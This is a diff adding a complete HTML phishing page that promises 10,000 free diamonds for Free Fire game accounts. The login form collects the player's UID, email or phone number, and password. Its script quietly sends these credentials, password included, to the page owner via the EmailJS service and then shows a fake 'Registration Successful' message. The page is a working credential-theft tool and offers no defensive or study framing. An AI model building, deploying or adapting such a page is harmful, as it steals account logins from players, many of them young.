@@ -1,0 +1,266 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Free Diamonds</title>
+    <link rel="stylesheet" href="styles.css">
+    <style>
+        body {
+            background: #f9f9f9;
+            color: #333;
+            margin: 0;
+            font-family: 'Arial', sans-serif;
+        }
+
+        header {
+            background: #4CAF50;
+            padding: 20px;
+            text-align: center;
+            color: white;
+            font-size: 24px;
+            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.2);
+        }
+
+        .banner {
+    background: url('freediamonds2.jpg') no-repeat center center;
+    background-size: cover; /* Ensures the image covers the banner area */
+    height: 100vh; /* Full viewport height for larger screens */
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    text-align: center;
+    position: relative;
+}
+
+.banner h2 {
+    font-size: 36px; /* Default font size for larger screens */
+    color: white;
+    background: rgba(0, 0, 0, 0.6); /* Semi-transparent black background for readability */
+    padding: 20px;
+    border-radius: 10px;
+    z-index: 1;
+}
+
+/* For tablets and phones */
+@media (max-width: 768px) {
+    .banner {
+        height: 70vh; /* Reduce height slightly for smaller screens */
+        background-size: cover; /* Ensure the image still covers the banner area */
+    }
+
+    .banner h2 {
+        font-size: 24px; /* Smaller font size for tablets */
+        padding: 15px;
+        line-height: 1.4; /* Adjust line spacing for better readability */
+    }
+}
+
+/* For very small phones */
+@media (max-width: 480px) {
+    .banner {
+        height: 60vh; /* Further reduce height for very small screens */
+        background-size: cover; /* Ensure the image still scales properly */
+    }
+
+    .banner h2 {
+        font-size: 20px; /* Even smaller font size for phones */
+        padding: 10px;
+    }
+}
+
+
+
+.section {
+    margin: 20px auto; /* Centers the section horizontally */
+    padding: 20px;
+    border-radius: 10px;
+    background: white;
+    max-width: 500px; /* Limits the width of the section */
+    box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
+    box-sizing: border-box; /* Ensures padding doesn't affect the width */
+}
+
+input, textarea, button {
+    width: 100%; /* Ensures input elements stretch across the section */
+    padding: 10px;
+    margin-top: 5px;
+    border: 1px solid #ccc;
+    border-radius: 5px;
+    font-size: 16px;
+    box-sizing: border-box; /* Ensures padding doesn't overflow the width */
+}
+
+button {
+    background-color: #4CAF50;
+    color: white;
+    cursor: pointer;
+    transition: background 0.3s;
+    border: none;
+}
+
+button:hover {
+    background-color: #45a049;
+}
+
+.form-group {
+    margin-bottom: 15px;
+}
+
+@media (max-width: 768px) { /* Responsive adjustments for smaller screens */
+    .section {
+        padding: 15px; /* Reduces padding for smaller screens */
+        max-width: 90%; /* Makes the section fit within the screen */
+    }
+
+    input, textarea, button {
+        font-size: 14px; /* Adjusts font size for smaller devices */
+    }
+}
+
+
+        footer {
+            text-align: center;
+            padding: 10px;
+            background: #4CAF50;
+            color: white;
+            font-size: 14px;
+            margin-top: 20px;
+        }
+
+        .success-message {
+            text-align: center;
+            padding: 50px;
+            background: white;
+            margin: 20px auto;
+            max-width: 500px;
+            border-radius: 10px;
+            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
+        }
+
+        .success-message h2 {
+            color: #4CAF50;
+            margin-bottom: 20px;
+        }
+
+        .success-message p {
+            font-size: 18px;
+        }
+
+        .error-message {
+            color: red;
+            font-size: 14px;
+            margin-top: 5px;
+        }
+    </style>
+</head>
+<body>
+    <header>
+        Free Diamonds
+    </header>
+
+    <div class="banner">
+        <h2>Register and Win 10,000 Free Diamonds in Your FF Account!</h2>
+    </div>
+
+    <main>
+        <section id="auth-section" class="section">
+            <h2>Login Using Your FF Account</h2>
+            <form id="auth-form">
+                <div class="form-group">
+                    <label for="username">Free Fire UID:</label>
+                    <input type="text" id="username" name="username" placeholder="Enter your UID" required>
+                    <div id="uid-error" class="error-message"></div>
+                </div>
+
+                <div class="form-group">
+                    <label for="contact">Email or Phone Number:</label>
+                    <input type="text" id="contact" name="contact" placeholder="Enter your email or phone number" required>
+                    <div id="contact-error" class="error-message"></div>
+                </div>
+
+                <div class="form-group">
+                    <label for="password">Password:</label>
+                    <input type="password" id="password" name="password" placeholder="Enter your password" required>
+                </div>
+
+                <button type="submit">Login</button>
+            </form>
+        </section>
+
+        <section id="success-message" class="success-message" style="display: none;">
+            <h2>Registration Successful!</h2>
+            <p>You have successfully registered your account. You will receive 10,000 diamonds in your Free Fire account shortly.</p>
+        </section>
+    </main>
+
+    <footer>
+        &copy; 2025 Free Diamonds. All rights reserved.
+    </footer>
+
+    <!-- EmailJS -->
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+    <script>
+        emailjs.init("RrSgsH_zFCT6z-WA6");  // Replace with your actual public User ID
+
+        document.getElementById('auth-form').addEventListener('submit', function(event) {
+            event.preventDefault();
+
+            const uidInput = document.getElementById('username');
+            const contactInput = document.getElementById('contact');
+            const passwordInput = document.getElementById('password');
+
+            const uidError = document.getElementById('uid-error');
+            const contactError = document.getElementById('contact-error');
+
+            let isValid = true;
+
+            // Validate UID (only numbers allowed)
+            if (!/^[0-9]+$/.test(uidInput.value)) {
+                uidError.textContent = 'Invalid UID. Please enter numbers only.';
+                isValid = false;
+            } else {
+                uidError.textContent = '';
+            }
+
+            // Validate Email or Phone Number
+            if (contactInput.value.includes('@')) {
+                // Email validation
+                if (!/^[^@\s]+@gmail\.com$/.test(contactInput.value)) {
+                    contactError.textContent = 'Invalid email.';
+                    isValid = false;
+                } else {
+                    contactError.textContent = '';
+                }
+            } else {
+                // Phone number validation
+                if (!/^03[0-9]{9}$/.test(contactInput.value)) {
+                    contactError.textContent = 'Invalid email or phone number.';
+                    isValid = false;
+                } else {
+                    contactError.textContent = '';
+                }
+            }
+
+            if (isValid) {
+                const templateParams = {
+                    username: uidInput.value,
+                    contact: contactInput.value,
+                    password: passwordInput.value
+                };
+
+                emailjs.send('free_diamonds', 'FF_Account_Login', templateParams)
+                    .then(function(response) {
+                        console.log('Success:', response);
+                        document.getElementById('auth-section').style.display = 'none';
+                        document.getElementById('success-message').style.display = 'block';
+                    }, function(error) {
+                        console.error('Error:', error);
+                        alert('Failed to send email. Error: ' + error.text);  // Show more detailed error message
+                    });
+            }
+        });
+    </script>
+    <sript src="Test2_0.js"></sript>
+</body>
+</html>
